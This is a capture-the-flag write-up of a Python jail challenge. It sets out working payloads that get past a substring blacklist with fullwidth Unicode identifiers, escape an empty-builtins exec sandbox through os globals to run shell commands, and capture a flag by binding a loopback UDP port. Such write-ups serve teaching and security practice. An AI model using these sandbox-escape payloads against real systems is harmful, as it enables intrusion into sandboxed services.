### The Fire-Control Terminal

> [fill in] · [fill in] · [fill in]
> Points at solve: [fill in]

**Tools used**

Raw TCP client, Python (payload crafting, base64).

**Approach**

The service (Operation Dawn, annex entry 13; category misc / pyjail + network) greets with an "ASH fire-control console" banner and a `>>>` prompt. Input is passed to a Python `exec` with an empty-builtins namespace. Unparseable/late-failing input returns `ERROR :: expression faulted`; input matching a blacklist returns `DENIED :: expression not authorised on this console`.

Observations:

- `a=1` then `a` works across lines → persistent, `exec`-like namespace
  (`exec(compile(src, "<console>", "exec"), env, env)` with `env = {"__builtins__": {}}`).
- Expression results are never echoed — only errors and denials are.
- The blacklist is a raw substring scan of the lowercased line:
  `import, eval, exec, compile, breakpoint, class, bases, base, subclasses, subclass,
  globals, builtins, getattr, setattr, mro, input, open, read, system, popen`.

1. **Blacklist bypass.** The check is a plain ASCII substring match, but Python identifiers are NFKC-normalized by the tokenizer. Fullwidth Latin letters in an identifier normalize to ASCII at parse time, so the source text never contains the banned ASCII substring:

```
().__ｃｌａｓｓ__.__ｂａｓｅｓ__          ->  ().__class__.__bases__
```

2. **Escaping to os.** The console process (`jail.py`) imports `os` and `socket`, so `os._wrap_close` exists in `object.__subclasses__()` and its `__init__.__globals__` is the `os` module namespace (which also exposes `sys`).

```
G=[c for c in ().__ｃｌａｓｓ__.__ｂａｓｅｓ__[0].__ｓｕｂｃｌａｓｓｅｓ__()
   if c.__ｎａｍｅ__=='_wrap_close'][0].__ｉｎｉｔ__.__ｇｌｏｂａｌｓ__
G['write'](1,b'HELLO!\n')      # fd 1 is the socket -> direct output
```

`popen`/`read` are blacklisted as source substrings, so use `'pop'+'en'` and the
NFKC-normalized attribute `ｒｅａｄ`:

```
G['write'](1,G['pop'+'en']('id; ls -la /').ｒｅａｄ().ｅｎｃｏｄｅ())
# uid=1000(ctf) ... inside a docker container
```

3. **The relay.** Reading `/opt/init.py`, `/opt/jail.py`, `/opt/sender.py`:

- `init.py` (root) reads `FLAG` from the environment and forks two children:
  - `sender.py` as uid 1001 — the relay; it receives the flag on stdin, never has it in its environment.
  - `jail.py` as uid 1000 — our console; never receives the flag.
- `sender.py` builds
  `"ASH CMD RELAY // STANDING ORDER SERIAL 13 // FIRE MISSION AUTH CODE " + base64url(flag)`
  and sends it to `127.0.0.1:49513` over **UDP** every second.
- Nothing listens on 49513 — the console is free to bind it.

Since the jail process already imports `socket`, reach it through the os-globals `sys`:

```
S=G['sys'].modules['socket']
s=S.socket(S.AF_INET,S.SOCK_DGRAM)
s.bind(('127.0.0.1',49513))
d=s.recvfrom(65535)[0]
G['write'](1,d)
```

Output:

```
ASH CMD RELAY // STANDING ORDER SERIAL 13 // FIRE MISSION AUTH CODE <redacted-base64url>
```

Decode:

```python
import base64
base64.urlsafe_b64decode("<redacted-base64url>")
# b'CSCTF{REDACTED}'
```

**Why it works**

`exec` with empty builtins removes the convenient names but not the object graph: every class in the process is reachable from `object.__subclasses__()`, and `os._wrap_close.__init__.__globals__` is the `os` module's global namespace, which also imports `sys`. The blacklist only scans raw source text, so NFKC normalization at the tokenizer layer smuggles the banned identifiers past it (fullwidth `ｃｌａｓｓ` parses as `class`). Finally, the relay broadcasts the flag over loopback UDP to a port nobody bound; the jailed process could bind it itself and print the datagram to fd 1, which is the client socket.

**Validation**

Binding `127.0.0.1:49513` and calling `recvfrom` returned the standing-order relay datagram containing the base64url-encoded flag; decoding it yielded `CSCTF{REDACTED}`. The console also gave direct output via `G['write'](1, ...)`. The flag is redacted here.
